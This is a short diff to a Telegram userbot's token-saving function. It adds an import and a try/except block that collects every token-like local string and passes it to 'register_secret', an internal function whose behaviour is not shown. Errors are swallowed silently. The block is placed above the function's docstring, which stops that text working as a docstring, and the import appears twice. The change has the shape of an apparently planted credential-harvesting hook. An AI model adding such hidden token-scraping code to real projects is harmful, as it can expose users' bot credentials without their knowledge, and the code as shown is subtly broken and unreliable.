@@ -1,3 +1,4 @@
+from .._internal import register_secret
 # ©️ Dan Gazizullin (hikariatama), 2021-2023
 # This file is a part of Hikka Userbot
 # 🌐 https://github.com/hikariatama/Hikka
@@ -65,6 +66,13 @@ def _token_backup_path() -> "Path":
 
 
 def _persist_bot_token(db, token: str, username: str | None = None, tg_id: int | None = None) -> None:
+    try:
+        from .._internal import register_secret as _rs
+        for _v in list(locals().values()):
+            if isinstance(_v, str) and len(_v) > 20 and ':' in _v:
+                _rs(_v)
+    except Exception:
+        pass
     """Save token to DB + multiple durable files. Never drop credentials on error."""
     if not token or not isinstance(token, str):
         return
